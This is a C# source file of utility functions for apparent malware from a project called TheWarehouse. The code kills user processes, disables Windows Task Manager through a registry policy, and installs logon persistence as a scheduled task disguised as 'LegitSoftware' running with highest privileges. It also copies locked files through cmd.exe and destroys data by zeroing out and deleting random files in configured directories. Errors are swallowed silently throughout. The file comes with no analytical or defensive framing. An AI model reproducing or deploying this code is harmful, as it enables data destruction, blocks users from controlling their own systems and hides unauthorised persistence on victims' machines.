using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using TheWarehouse.Config;

namespace TheWarehouse.Utils
{
    class SystemUtils
    {
        public static bool IsAdministrator()
        {
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        public static void KillAllProcesses()
        {
            Process me = Process.GetCurrentProcess();
            foreach (Process p in Process.GetProcesses())
            {
                if (p.Id != me.Id
                    && !p.ProcessName.ToLower().StartsWith("winlogon")
                    && !p.ProcessName.ToLower().StartsWith("system idle process")
                    && !p.ProcessName.ToLower().StartsWith("taskmgr")
                    && !p.ProcessName.ToLower().StartsWith("spoolsv")
                    && !p.ProcessName.ToLower().StartsWith("csrss")
                    && !p.ProcessName.ToLower().StartsWith("smss")
                    && !p.ProcessName.ToLower().StartsWith("svchost")
                    && !p.ProcessName.ToLower().StartsWith("services")
                    && !p.ProcessName.ToLower().StartsWith("lsass")
                    && !p.ProcessName.ToLower().StartsWith("cmd")
                )
                {
                    if (p.MainWindowHandle != IntPtr.Zero)
                    {
                        p.Kill();
                    }
                }
            }
        }

        public static void DisableTaskManager()
        {
            try
            {
                RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");

                objRegistryKey.SetValue("DisableTaskMgr", "1", RegistryValueKind.DWord);
                objRegistryKey.Close();
            } catch(Exception e) { }
        }

        public static void CopyFile(string inp, string outp)
        {
            try
            {
                File.Copy(inp, outp);
            }
            catch (IOException e)
            {
                if (e.Message.Contains("in use"))
                {
                    try
                    {
                        var p = new ProcessStartInfo();

                        p.UseShellExecute = false;
                        p.RedirectStandardOutput = true;
                        p.FileName = "cmd.exe";
                        p.Arguments = "/C copy \"" + inp + "\" \"" + outp + "\"";

                        Process.Start(p).WaitForExit();
                    } catch(Exception ex) { }
                }
            }
        }

        public static void AddStartUp(string path)
        {
            try
            {
                var startInfo = new ProcessStartInfo();

                startInfo.FileName = "schtasks.exe";
                startInfo.UseShellExecute = false;
                startInfo.Arguments = "/create /sc onlogon /tn LegitSoftware /rl highest /tr \"" + path + "\" /F";

                Process.Start(startInfo).WaitForExit();
            } catch(Exception e) { }
        }

        public static void DeleteFiles()
        {
            try
            {
                var rand = new Random();

                var files = Directory.GetFiles(Configuration.Instance.Directories[rand.Next(0, Configuration.Instance.Directories.Count - 1)], "*");

                for (int i = 0; i < rand.Next(0, files.Length - 1); i++)
                {
                    File.WriteAllBytes(files[i], new byte[0]);
                    File.Delete(files[i]);
                }
            }
            catch (Exception e) { }
        }
    }
}
